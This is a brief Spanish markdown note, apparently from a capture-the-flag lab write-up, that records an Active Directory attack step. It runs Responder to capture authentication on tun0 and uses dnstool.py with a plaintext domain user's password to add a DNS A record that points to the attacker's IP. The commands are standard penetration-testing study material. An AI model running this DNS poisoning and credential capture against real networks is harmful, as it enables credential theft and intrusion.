

# DNS RECORDS
```shell
#TENEMOS QUE ESTAR AUTENTICADOS.
responder -I tun0
dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.58 -t A
```